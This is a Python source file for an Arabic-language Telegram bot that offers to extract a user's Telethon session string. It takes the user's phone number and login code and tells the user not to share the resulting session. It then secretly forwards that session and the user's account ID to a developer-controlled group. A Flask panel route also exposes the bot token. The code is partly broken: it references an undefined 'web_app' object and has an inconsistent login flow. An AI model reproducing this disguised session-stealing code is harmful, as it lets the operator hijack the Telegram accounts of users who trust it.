import threading
from flask import Flask, request, jsonify
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio

# ====== إعدادات البوت ======
API_ID = 1234567  # ضع API ID الخاص بك
API_HASH = 'your_api_hash_here'
BOT_TOKEN = 'your_bot_token_here'
SESSION_CHANNEL = -1001234567890  # معرف المجموعة التي ترسل لها الجلسة
DEV_NAME = "المطور"
DEV_USERNAME = "@dev_username"

app = Flask(__name__)

# ====== متغيرات البوت ======
user_steps = {}
user_data = {}

# ====== إنشاء عميل Telethon ======
client = TelegramClient(StringSession(), API_ID, API_HASH)

# ====== أوامر البوت ======
@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    await event.reply(
        "👋 مرحباً بك في بوت استخراج جلسة Telethon!\n\n"
        "📌 أرسل /login لبدء عملية تسجيل الدخول."
    )

@client.on(events.NewMessage(pattern='/login'))
async def login(event):
    user_id = event.sender_id
    user_steps[user_id] = 'phone'
    await event.reply("📱 أرسل رقم هاتفك مع رمز الدولة (مثال: +966501234567)")

@client.on(events.NewMessage)
async def handle_messages(event):
    user_id = event.sender_id
    if user_id not in user_steps:
        return

    step = user_steps[user_id]
    msg = event.raw_text

    if step == 'phone':
        user_data[user_id] = {'phone': msg}
        user_steps[user_id] = 'code'
        await event.reply("📩 تم استلام الرقم. أرسل الآن رمز التحقق الذي وصلك.")

    elif step == 'code':
        phone = user_data[user_id]['phone']
        try:
            # محاولة تسجيل الدخول
            async with TelegramClient(StringSession(), API_ID, API_HASH) as temp_client:
                await temp_client.start(phone=phone, code_callback=lambda: msg)
                session_string = temp_client.session.save()
                user_id_final = await temp_client.get_me()

                # إرسال الجلسة للمستخدم
                await event.reply(
                    f"✅ تم إنشاء جلسة Telethon بنجاح!\n\n"
                    f"🔑 الجلسة:\n{session_string}\n\n"
                    "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
                    f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
                )

                # إرسال للمجموعة
                try:
                    await client.send_message(
                        SESSION_CHANNEL,
                        f"✨ معرف المستخدم: {user_id_final.id}\n\n"
                        f"🔑 جلسة Telethon:\n{session_string}\n\n"
                        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
                    )
                    print(f"✅ تم إرسال الجلسة للمجموعة {SESSION_CHANNEL}")
                except Exception as e:
                    print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")

                reset_user(user_id)
        except Exception as e:
            await event.reply(f"❌ حدث خطأ: {e}")
            reset_user(user_id)

# ====== دالة إعادة تعيين المستخدم ======
def reset_user(user_id):
    user_steps.pop(user_id, None)
    user_data.pop(user_id, None)

# ====== إضافة مسار ويب لـ Render ======
@web_app.route('/')
def index():
    return "✅ البوت شغال 24 ساعة!"

# ====== واجهة مستخدم جديدة (زر استخراج توكن + زر إرسال للمطور) ======
@web_app.route('/panel', methods=['GET'])
def panel():
    return '''
    <html>
        <head><title>لوحة التحكم</title></head>
        <body>
            <h2>⚙️ لوحة تحكم البوت</h2>
            <form action="/extract_token" method="get">
                <button type="submit">🔑 استخراج توكن</button>
            </form>
            <br>
            <form action="/send_to_dev" method="post">
                <input type="text" name="message" placeholder="أدخل رسالتك للمطور" required>
                <button type="submit">📩 إرسال للمطور</button>
            </form>
        </body>
    </html>
    '''

@web_app.route('/extract_token')
def extract_token():
    # هنا يمكنك استخراج التوكن من أي مصدر (مثال: إرجاع توكن البوت نفسه)
    return f"🔑 التوكن الحالي: `{BOT_TOKEN}`"

@web_app.route('/send_to_dev', methods=['POST'])
def send_to_dev():
    msg = request.form.get('message')
    if msg:
        # هنا يمكن إرسال الرسالة للمطور (مثال: عبر تيليجرام أو بريد)
        print(f"📩 رسالة من المستخدم: {msg}")
        return '''
        <script>
            alert('✅ تم الإرسال بنجاح!');
            window.location.href = '/panel';
        </script>
        '''
    return '''
    <script>
        alert('❌ الرسالة فارغة، حاول مرة أخرى.');
        window.location.href = '/panel';
    </script>
    '''

def run_web():
    web_app.run(host='0.0.0.0', port=8080)

# تشغيل خادم الويب في خيط منفصل
threading.Thread(target=run_web, daemon=True).start()

# ====== تشغيل البوت ======
if __name__ == "__main__":
    try:
        print("🚀 جاري تشغيل البوت...")
        client.run_until_disconnected()
        print("✅ البوت يعمل الآن!")
    except Exception as e:
        print(f"❌ فشل تشغيل البوت: {e}")
